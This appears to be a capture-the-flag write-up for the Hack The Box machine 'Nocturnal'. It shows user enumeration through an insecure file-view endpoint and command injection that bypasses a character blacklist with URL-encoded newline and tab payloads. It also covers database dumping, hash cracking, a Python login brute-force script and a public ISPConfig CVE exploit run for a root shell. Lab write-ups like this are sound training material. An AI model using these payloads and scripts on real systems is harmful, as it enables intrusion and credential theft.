# By vishok escapetwo
# htb writeup
####
####
####
## Open ports in the target machine
### Nmap:
After spawm machine we need to make a recognition phase, **nmap** is very hepful to discover the ports and services that is running over target machine.
####
<div class="tip">

> Is time to perfom a scan using **nmap** to discover a treasure. 
</div>

####
```ruby
22/tcp open  ssh
80/tcp open  http
```
####
Result of the nmap scan:
####
```ruby
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
####
####
####
## Services that is running in the target machine
### HTTP:
The **nmap** report us a domain http://nocturnal.htb, first, we need to add that domain into our `/etc/hosts` file to cover the virtual hosting. So once that we do it, is necessary open browser and put the same previous url. The web site look like this:
####
<div class="img">
    <img src="/machines/public/nocturnal/1.png" loading="lazy" decoding="async" />
</div>

####
How we don't have credentials we must to register to enter and see the content of the dashboard.
####
The dashboard allow us to upload files, so if we try to upload any kind of file, the web site show us this: *Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed*. So that suggest us that is neccesary craft a evil *PDF* file to bypass or get a revershell. But first, we will prove something.
####
If we upload a valid file with any extention that is cover for the web site. We will are able to see that the file can be downloaded. The link of download have a interesting format: `http://nocturnal.htb/view.php?username=vishok&file=gdb.pdf`. This link download a file for a specifique user. We are the **vishok** user, but what happend if we try to download file to other user?
####
First, we will try to download a not existing file to our user, the result is this:
####
<div class="img">
    <img src="/machines/public/nocturnal/2.png" loading="lazy" decoding="async" />
</div>

####
We always can see a output althought the file not exist, so that told us that is possible to enumerate other existing user. Because if we try to download a file to not existing user: `http://nocturnal.htb/view.php?username=vishok&file=gdb.pdf` the result is: *User not found*. So that is possible to enumerate other users. To make this, we will use **caido**.
####
Caido have a section to upload local files, this files help us to make a **automate** attacks. In our case we upload a user dicctionary files. And select mark the user field like payload.
####
```ruby
GET /view.php?username=vishok1&file=*.pdf HTTP/1.1
Host: nocturnal.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive
Cookie: PHPSESSID=egi4om9h7jakuk7knlv7s7rfeu
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
####
Then, we insert a filter to find existing users `resp.raw.ncont:"User not found."`. Few error can occurs, so to cover them we can add other filter `resp.raw.ncont:"User not found." and resp.code.eq:200`.
####
<div class="img">
    <img src="/machines/public/nocturnal/3.png" loading="lazy" decoding="async" />
</div>

####
The key is find all files using a `*` character. The wildcard character meaning [*All*, *Everithing*]. So whit this is posible to see any files that posses a valid user in the *HTTP* service.
####
Ther user **amanda** is a valid user, and this user only have one file: `privacy.odt`. So we could try to fetch this file and download it in our computer to see what is the content of that file. In my case I used **LibreOffice** to open the file.
####
```ruby
Dear Amanda,

Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.
Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.

Yours sincerely,
Nocturnal's IT team
```
####
A temporary password was set up to `amanda` user : `amanda:arHkG7HAI68X8s1J`. This credential not work to *SSH* service. So we try to see if other seccion is unlocked in the dashboard panel to **amanda** user. And yes, a new link *Go to Admin Panel* was unlocked, if we access to this link take us a new page.
####
<div class="img">
    <img src="/machines/public/nocturnal/4.png" loading="lazy" decoding="async" />
</div>

####
If we make click over a available php links, below we will are able to see the code of that file. The most interesting file is the `admin.php` because this file seems to sanitize entry, the function is this:
####
```php
function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}
```
####
This function detect a specifique characteres into the entry. So, what is the entry that the function sanitize? We can see the entry in the next part code. You can see this more below.
####
```php
$password = cleanEntry($_POST['password']);
$backupFile = "backups/backup_" . date('Y-m-d') . ".zip";

if ($password === false) {
    echo "<div class='error-message'>Error: Try another password.</div>";
} else {
    $logFile = '/tmp/backup_' . uniqid() . '.log';
   
    $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
    
    $descriptor_spec = [
        0 => ["pipe", "r"], // stdin
        1 => ["file", $logFile, "w"], // stdout
        2 => ["file", $logFile, "w"], // stderr
    ];

    $process = proc_open($command, $descriptor_spec, $pipes);
    if (is_resource($process)) {
        proc_close($process);
    }

    sleep(2);
```
####
The entry is the passowrd `$password = cleanEntry($_POST['password']);`, so we can try to inject a malicious code into this entry because more under is this:
####
```ruby
$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
```
####
The backup is performed using a command into the target machine. The password entry is insert into the command as **param**, so in Linux you can inject other command inserting a `;` character. Following this approach, we need to achieve execute commands into the target machine.
####
<div class="img">
    <img src="/machines/public/nocturnal/5.png" loading="lazy" decoding="async" />
</div>

####
How the web site deleted the `;` and **spaces**, the execute additional command is imposible so far. But we could try to discover which other character comply with this approaching. I found other focus, to sustitute the **spaces** we can use a **tab**, this in **url-encode** is `%0A`, and for sustitute `;` we can use a **jump-line**, this in **url-encode** is `%09`.
####
| Characteres Param | Description |
| ----- | ----- |
| %0A | Url-encode jump-line |
| %09 | Url-encode tab |
####
In plain text look like this:
####
```ruby
[jump]
cat[tab]/etc/passwd
[jump]

;cat /etc/passwd;
```
####
In `view.php` file, we can se a `.db` file path:
####
```ruby
$db = new SQLite3('../nocturnal_database/nocturnal_database.db');
```
####
But we don't now what is the complete path. So now we are able to execute commands in the target machine. Almost always the web services are hosted in `/var/www`, so we could try to expose that path in *HTTP* port to make *Directory Listing*.
####
```ruby
[jump]
cd[tab]/var
[jump]
python3[tab]-m[tab]http.server[tab]

;cd /var;python -m http.server;
```
####
The correct field password:
####
```ruby
password=%0Acd%09/var%0Apython3%09-m%09http.server%0A&backup=
```
####
<div class="img">
    <img src="/machines/public/nocturnal/6.png" loading="lazy" decoding="async" />
</div>

####
####
####
## First explotation phase
### SQlite3:
This will expose a directory `/var` in *8000* port, this port is a default port of python server. Making a *Directory Listing* we discovered where is the `.db` file: http://10.10.11.64:8000/www/nocturnal_database/nocturnal_database.db. So we can download that file and open with **sqlite3** or **DB Browser for SQLite** [DB-Browser](https://sqlitebrowser.org/dl/).
####
I will use a browser a **sqlite3** command.
####
```ruby
sqlite3 nocturnal_database.db
select * from users;
    Result -> 
        1|admin|d725aeba143f575736b07e045d8ceebb
        2|amanda|df8b20aa0c935023f99ea58358fb63c4
        4|tobias|55c82b1ccd55ab219b3b109b07d5061d
        6|kavi|f38cde1654b39fea2bd4f72f1ae4cdda
        7|e0Al5|101ad4543a96a7fd84908fd0d802e7db
        8|det0xgravity|cc03e747a6afbbcbf8be7668acfebee5
        9|dario|8a49317e060e23bb86f9225ca581e0a9
```
####
The are many credentials to copy and paste them into a new file to crack it whit **hashcat**. So for sanitize the data I will use this code:
####
```ruby
echo '
    1|admin|d725aeba143f575736b07e045d8ceebb
    2|amanda|df8b20aa0c935023f99ea58358fb63c4
    4|tobias|55c82b1ccd55ab219b3b109b07d5061d
    6|kavi|f38cde1654b39fea2bd4f72f1ae4cdda
    7|e0Al5|101ad4543a96a7fd84908fd0d802e7db
    8|det0xgravity|cc03e747a6afbbcbf8be7668acfebee5
    9|dario|8a49317e060e23bb86f9225ca581e0a9
' | awk  -F '|' '{print $3}' > hashes
``` 
####
| Awk param | Description |
| ----- | ----- |
| -F | Specify a separator of the data |
| print | Print fields bettween the separator character, the $1, $2, $3 |
####
Now we only have a passowrd in our **hashes** file.
####
```ruby
hashcat -a 0 -m 0 hashes /usr/share/wordlists/dictionary/rockyou.txt
    Result -> 
        8a49317e060e23bb86f9225ca581e0a9:dario
        cc03e747a6afbbcbf8be7668acfebee5:test123
        55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse
```
####
| Hashcat Param | Description |
| ----- | ----- |
| -a | Specifies brute force attacks *Brute Force* |
| -m | Specifies the mode to use to crack the hash |
####
Now we have 3 credentials, is only to see what password match with users. `dario`, `det0xgravity`, `tobias`. These are users, how *SSH* port is open, we try to connect toward target machine using some of those credentials. `tobias:slowmotionapocalypse` is a valid credential to logon via SSH service.
####
####
####
## Second exploit phase (Privilage Escalation)
### ISP Config:
Like **tobias** user into the target machine we search files or binaries with *SUID* permissions, capabilities and binaries that we will can execute like a **root** user, unfornatelly, we aren't in **sudoers** group. The common approach is enumerate internal open ports.
####
```ruby
netstat -a
    Result ->
        Proto Recv-Q Send-Q Local Address           Foreign Address         State
        tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN
        tcp        0      0 localhost:smtp          0.0.0.0:*               LISTEN
        tcp        0      0 localhost:33060         0.0.0.0:*               LISTEN
        tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN
        tcp        0      0 localhost:submission    0.0.0.0:*               LISTEN
        tcp        0      0 localhost:http-alt      0.0.0.0:*               LISTEN     
        tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN     
        tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN     
        tcp        0    316 nocturnal:ssh           10.10.16.12:60712       ESTABLISHED
        tcp6       0      0 [::]:ssh                [::]:*                  LISTEN     
        udp        0      0 localhost:domain        0.0.0.0:*
```
####
| Netstat param | Description |
| ----- | ----- |
| -a | Display all sockets |
####
So the previous command report us that into the target machine run a service over *8080* port. To see the content of that service is necessary to make a *Local Port Forwarding*. Espose that service in a specifique port in our machine.
####
```ruby
ssh -L 8080:localhost:8080 tobias@10.10.11.64
```
####
| SSH param | Description |
| ----- | ----- |
| -L | Local address to run the remote service |
| 1. 8080 | Port over run the service in the target machine | 
| 2. 8080 | Port over will run the service in the our machine |
####
At the moment to access in the service http://localhost:8080 a login panel is showed. We have many credentials, but which credential work? The default credentials to *IPS Config* also not work.
####
<div class="tip">

> Is time to craft our custom script to verify a valid credential.
</div>

####
```ruby
#!/usr/bin/python3

import requests
from time import sleep
from pwn import log

def main():
    url = 'http://localhost:8080/login'

    users = [
    	"admin",
    	"amanda",
    	"tobias",
    	"kavi",
    	"e0Al5",
    	"det0xgravity",
    	"dario"
    ]

    passwords = [
    	"slowmotionapocalypse",
    	"admin",
    	"test123",
    	"dario",
    	"arHkG7HAI68X8s1J"
    ]

    cookies = {
    	"ISPCSESS" : "2skbde830c1d3um1gnh1mtv1gl"
    }
    
    bar = log.progress("Brute force attack...")

    for user in users:
    	for password in passwords:
            data = {
                "username" : user,
                "password" : password,
                "s_mod" : "login",
                "s_pg" : "index"
            }           
            try:
                bar.status(f"Trying {user}:{password} credential")
                response = requests.post(url=url, cookies=cookies, data=data, timeout=5, allow_redirects=False)
                if response.status_code == 302:
                    print()
                    log.success(f"{user}:{password} are valid")
            except: pass
                sleep(5)

if __name__ == '__main__':
    main()
```
####
This was possible because we intercept a authentication attempt login and we can get the data format and the cookie. So with this data now is possible to craft a custom script, after execute the script a valid credential was reported `admin:slowmotionapocalypse are valid`. Navigating into the dashboard we discovered a version *ISP Config 3.2.1*.
####
Looking for exploit, exist a vulnerability that allow inject *PHP* code into the target machine. **Metasploit** nos work here, at lest in my case, but a found other *CVE* exploit: [CVE-2023-46818-Exploit](https://github.com/blindma1den/CVE-2023-46818-Exploit/blob/main/exploit.py). So we can try with this.
####
```ruby
git clone https://github.com/blindma1den/CVE-2023-46818-Exploit.git
cd CVE-2023-46818-Exploit
python3 exploit.py http://localhost:8080 admin slowmotionapocalypse
```
####
This establish a revershell like a **root** user.